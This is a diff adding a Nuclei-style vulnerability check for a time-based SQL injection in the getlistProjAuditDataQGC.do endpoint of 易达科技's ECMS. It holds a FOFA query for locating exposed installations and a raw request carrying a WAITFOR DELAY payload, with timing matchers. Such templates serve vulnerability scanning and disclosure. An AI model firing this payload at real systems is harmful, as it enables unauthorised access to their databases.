@@ -1,0 +1,34 @@
+id: ecms-getlistProjAuditDataQGC-sqli
+info:
+  name: 易达科技-ECMS getlistProjAuditDataQGC 存在SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 易达科技的ECMS（工程造价咨询企业管理系统）是一款面向工程造价咨询企业的综合管理系统，它深度融合了行业最佳实践与前沿信息技术，旨在推动企业的数字化转型与全过程工程咨询业务的高效开展，易达科技-ECMSgetlistProjAuditDataQGC 接口存在SQL注入漏洞，攻击者可获取数据库敏感信息
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/yzcltsdnp01z2fgl
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="ECMS全信息化咨询企业管理系统"
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,ecms
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /procedure/getlistProjAuditDataQGC.do?projAudit.isOut=1&businessId=1%27WAITFOR%20DELAY%20%270:0:5%27--&uesrId=1&costWorkId=1&flowId=1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
